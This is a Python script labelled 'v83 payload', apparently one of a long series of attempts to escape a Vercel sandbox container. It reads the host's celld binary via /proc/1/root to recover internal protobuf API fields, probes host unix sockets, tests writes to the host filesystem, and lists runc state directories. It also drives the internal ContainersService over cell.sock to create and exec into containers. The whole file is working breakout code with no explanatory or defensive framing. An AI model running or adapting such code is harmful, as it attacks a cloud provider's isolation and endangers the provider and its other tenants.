# -*- coding: utf-8 -*-
"""v83 payload: Getter 方法名提取 StreamOutputRequest 字段 + 枚举值 + 重跑被截断的测试
v82: TAG 格式确认 (protobuf:"bytes,N,opt,name=xxx,proto3"), CreateRequest.GetAttachStdin 存在,
     /run/cell/runc/<uuid> 是 drive 容器状态目录
方法: Go protobuf 生成代码 Getter 名 = 字段名 -> 搜 "<Msg>).Get" 上下文"""
import socket, time, os, json, re

OUT = '/vercel/sandbox/v83c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v83c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:100], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


def main():
    log('V83 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    R = '/proc/1/root'

    data = open(R + '/opt/vercel/celld', 'rb').read()
    log('celld size=%d' % len(data))

    # A. Getter 方法名 -> 消息字段
    for msg in ('StreamOutputRequest', 'StreamOutputResponse', 'ExecRequest', 'ExecResponse',
                'CreateRequest', 'CreateResponse', 'ProcessStartRequest', 'WaitRequest',
                'StdinRequest', 'KillRequest'):
        pat = re.compile(re.escape(msg.encode()) + rb'\)\.Get([A-Za-z0-9_]+)')
        got = sorted(set(m.group(1).decode() for m in pat.finditer(data)))
        log('GET %s -> %s' % (msg, got))

    # B. OutputStream 枚举 (containers + processes)
    for ns in ('containers', 'processes'):
        for kind in ('_name', '_value'):
            pat = re.compile(re.escape(('OutputStream' + kind).encode()) + rb'\s*=\s*\.\.\.\{')
            m = pat.search(data)
            log('ENUM %s.%s found=%s' % (ns, kind, bool(m)))
        # enum 值常量: OUTPUT_STREAM_xxx / 大写
        pat = re.compile(rb'[A-Z][A-Z0-9_]*(?:OUTPUT|STREAM|STDOUT|STDERR)[A-Z0-9_]*')
        vals = sorted(set(s.decode(errors='replace') for s in pat.findall(data)))
        log('ENUMVALS(%s) -> %s' % (ns, vals[:40]))
        # Getter: OutputStream_xxx.String / OutputStream_name 数组内容
        pat = re.compile(re.escape(('containers.OutputStream_').encode()) + rb'[A-Za-z0-9_]+')
        vals2 = sorted(set(m.group(0).decode(errors='replace') for m in pat.finditer(data)))
        log('ENUMFULL(%s) -> %s' % (ns, vals2[:40]))

    # C. 字段 tag 精确提取
    for fn in ('container_id', 'process_id', 'stream', 'output_stream', 'attach_stdin',
               'containerId', 'processId', 'stdout', 'stderr'):
        pat = re.compile(rb'protobuf:"[^"]*name=' + re.escape(fn.encode()) + rb'[^"]*"')
        ms = pat.findall(data)
        log('TAG %s -> %d: %s' % (fn, len(ms), [m[:130] for m in ms[:6]]))

    # D. host socket 探测
    for sp in ('/run/cell/host.sock', '/run/cell/agent.sock', '/run/cell/control.sock',
               '/run/metrics/metrics.sock', '/run/apm/apm.sock', '/run/host.sock'):
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(R + sp)
            log('SOCK %s CONNECT OK' % sp)
            s.close()
        except Exception as e:
            log('SOCK %s %s' % (sp, type(e).__name__))

    # E. 写测试
    try:
        open(R + '/tmp/v83_write_test.txt', 'w').write('v83 write test\n')
        log('WRITE /tmp/v83_write_test.txt OK')
    except Exception as e:
        log('WRITE ERR %s' % e)

    # F. drive 容器 runc 状态目录
    try:
        base = R + '/run/cell/runc'
        for d in sorted(os.listdir(base)):
            p = base + '/' + d
            log('RUNC-DIR %s -> %s' % (d, '; '.join(sorted(os.listdir(p))[:20])))
    except Exception as e:
        log('RUNC-DIR ERR %s' % e)

    # G. Exec + unix socket 回连
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v83x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v83x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V83_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v83x.sock\')" & '
                'sleep 20']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA unix -> %s | PA=%s' % (st, PA or bd[:120]))
        time.sleep(2)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v83x.sock')
            d = s.recv(100)
            log('UNIX-CONNECT OK got=%r' % d)
            s.close()
        except Exception as e:
            log('UNIX-CONNECT ERR %s' % type(e).__name__)
        log('host-run-sock: %s' % (os.path.exists('/run/v83x.sock') and 'EXISTS' or 'ABSENT'))
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')

    log('V83C_DONE')


main()
